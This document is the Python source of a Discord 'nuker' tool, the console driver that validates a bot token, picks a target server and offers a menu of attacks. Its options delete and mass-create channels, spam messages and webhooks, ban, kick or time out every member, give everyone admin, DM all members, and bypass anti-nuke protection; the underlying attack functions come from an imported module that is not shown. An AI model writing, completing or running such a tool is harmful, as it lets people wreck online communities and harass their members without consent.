import os
import requests
import threading
import sys
import time
import ctypes
import json

from shi.console import *
from shi.nuker import *

def cls():
    os.system('cls')

config = 'config.json'

cls()
bnr = Ascii().ascii()
bnr2 = Ascii().ascii2('     TIP: you can type "fnt" for a server id ')

try:
    with open(config, 'r', encoding='utf-8') as f:
        conf = json.load(f)

except:
    with open(config, 'w', encoding='utf=8') as f:
        json.dump({
            "ban": False,
            "webhook": False,
            "embed": False,
            "days": 28
        }, f, indent=4)
    with open(config, 'r', encoding='utf-8') as f:
        conf = json.load(f)

os.makedirs('tmp', exist_ok=True)

ban = conf.get('ban', False)
usewebhook = conf.get('webhook', False)
useembed = conf.get('embed', False)
timeday = conf.get('days', 28)

class Nukebot:
    def __init__(self):
        self.tkn = None
        self.id = None
        self.name = None
        self.invite = None
        self.server = None
        self.serverid = None

    def setb(self, tkn, id, name, invite):
        self.tkn = tkn
        self.id = id
        self.name = name
        self.invite = invite

    def setS(self, server, serverid):
        self.server = server
        self.serverid = serverid

def mcb(lines=1):
    print(f"\033[{lines+1};0H", end='')

def cbb():
    print("\033[J", end='')

def verify(tkn):
    v = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': f'Bot {tkn}'})
    if v.status_code in [200, 201, 204]:
        return 'Valid'
    else:
        return False

Nukebot = Nukebot()

def botinfo(tkn):
    v = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': f'Bot {tkn}'})
    if v.status_code in [200, 201, 204]:
        return v.json()
    else:
        return False

def interface():
    bnr = Ascii().ascii()

    nuke = Nuke(tkn=Nukebot.tkn, server=Nukebot.server, serverid=Nukebot.serverid, wbh='labubu fonk', embeds=useembed, ban=ban, webhook=usewebhook)

    ctypes.windll.kernel32.SetConsoleTitleW(f'xvhjs dih | {Nukebot.name} | {Nukebot.server}')
    bnr += Options().options()
    mcb(lines=1)
    cbb()
    print(bnr)
    
    option = Logging.inp('Menu', 'Option')
    id = Nukebot.serverid
    if option == '67':
        nuke.DChannels(id)
        time.sleep(1)

        nuke.CChannels(id)
        time.sleep(0.5)
        if usewebhook:
            x = nuke.SpamWebhooks()
            time.sleep(1)
            Logging.inp2('Press enter')
            cls()
            interface()
        else:
            x = nuke.Spam()
            time.sleep(1)
            Logging.inp2('Press enter')
            cls()
            interface()

    elif option == '1':
        conf = Logging.inp('DChannels', 'Confirm (type y or n)')
        if conf.lower() == 'y':
            nuke.DChannels(id)
            time.sleep(1)
            Logging.inp2('Press enter')
            cls()
            interface()
        else:
            cls()
            interface()

    elif option == '2':
        name = Logging.inp('Server', 'Name')
        icon = Logging.inp('Icon', 'Image')
        nuke.EditServer(name, icon)
        time.sleep(1)
        Logging.inp2('Press enter')
        cls()
        interface()
    
    elif option == '3':
        name = Logging.inp('CChannels', 'Name')
        amount = int(Logging.inp('CChannels', 'Amount'))
        nuke.CChannels2(id, name, amount)
        time.sleep(1)
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '4':
        msg = Logging.inp('Spam', 'Message')
        amount = int(Logging.inp('Spam', 'Amount'))
        nuke.Spam2(msg, amount)
        time.sleep(1)
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '5':
        nuke.SpamWebhooks2()
        time.sleep(1)
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '6':
        name = Logging.inp('Roles', 'Name')
        amount = int(Logging.inp('Roles', 'Amount'))
        nuke.CRoles(id, name, amount)
        Logging.inp2('Press enter')

        cls()
        interface()

    elif option == '7':
        userid = Logging.inp('Admin', 'ID')

        nuke.GiveAdmin(id, userid)
        Logging.inp2('Press enter')
        cls()
        interface()
        
        
    elif option == '8':

        nuke.BanAll()
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '9':
        nuke.KickAll()
        Logging.inp2('Press enter')
        cls()
        interface()
    
    elif option == '10':
        nuke.GiveEveryoneAdmin(id)
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '11':
        mg = Logging.inp('DM', 'Message')
        nuke.DMAll(mg)
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '12':
        nuke.TimeoutAll(timeday)
        Logging.inp2('Press enter')
        cls()
        interface()
    elif option == '13':
        nuke.disable_community()
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '21':
        cls()
        gl = selguild(Nukebot.tkn)
        if gl:
            interface()

    elif option == '41':
        cls()
        main()

    elif option == '61':
        msg = ''
        nuke.AntiNukeBypass(msg)
        Logging.inp2('Press enter')
        cls()
        interface()

    elif option == '100':
        exit()
    
    else:
        Logging.fail('Choose an option')
        time.sleep(1)
        cls()
        interface()


def getguilds(tkn):
    pth = os.path.abspath('tmp/guilds.txt')
    v = requests.get('https://discord.com/api/v9/users/@me/guilds', headers={'authorization': f'Bot {tkn}'})
    if v.status_code in [200, 201, 204]:
        js = v.json()
        with open(pth, 'w', encoding='utf-8') as f:
            for g in js:
                f.write(f"{g.get('name', 'Unknown')} - {g.get('id', 'Unknown')}\n")
                if not g:
                    f.write('The bot is not in any servers')
        os.startfile(pth)
        return True
    else:
        return False

def checkguild(tkn, guild):
    v = requests.get(f'https://discord.com/api/v9/guilds/{guild}', headers={'authorization': f'Bot {tkn}'})
    if v.status_code in [200, 201, 204]:
        return guild
    else:
        return False

def guildinfo(tkn, guild):
    v = requests.get(f'https://discord.com/api/v9/guilds/{guild}', headers={'authorization': f'Bot {tkn}'})
    if v.status_code in [200, 201, 204]:
        return v.json()
    else:
        return False

def selbot():
    while True:
        mcb(lines=1)
        cbb()
        print(bnr)
        token = Logging.inp('Login', 'Token')
        cbb()
        valid = verify(token)
        if not token:
            Logging.fail('yk you need a bot token for ts to work')
            time.sleep(1.5)
        elif valid:
            Logging.success('Valid token')
            cp = botinfo(token)
            Nukebot.setb(token, cp['id'], cp['username'] + '#' + cp['discriminator'], f'https://discord.com/oauth2/authorize?client_id={cp["id"]}&permissions=2251817798991934&integration_type=0&scope=bot')
            time.sleep(1.5)
            return token

        else:
            Logging.fail('Invalid token')
            time.sleep(1.5)

def selguild(token):
    ctypes.windll.kernel32.SetConsoleTitleW(f'xvhjs dih | {Nukebot.name} | Selecting a server')
    while True:
        mcb(lines=1)
        print(Ascii().ascii2(f'TIP: you can type "fnt" for a server id or add the bot using this link: \n{Nukebot.invite}'))

        cbb()

        g = Logging.inp('Login', 'Server ID')
        gld = checkguild(token, g)
        if 'fnt' in g:
            gl = getguilds(token)
            if not gl:
                Logging.fail('Failed to fetch servers')
                time.sleep(1.5)
        elif gld:
            Logging.success('Bot is in the server')
            mg = guildinfo(token, g)

            Nukebot.setS(mg['name'], gld)
            time.sleep(1.5)
            cls()

            return True
        else:
            Logging.fail("Bot isn't in the server")
            time.sleep(1)

def main():
    ctypes.windll.kernel32.SetConsoleTitleW(f'xvhjs dih | Login')

    tk = selbot()
    if tk:
        gl = selguild(tk)
        if gl:
            interface()

if __name__ == '__main__':

    main()


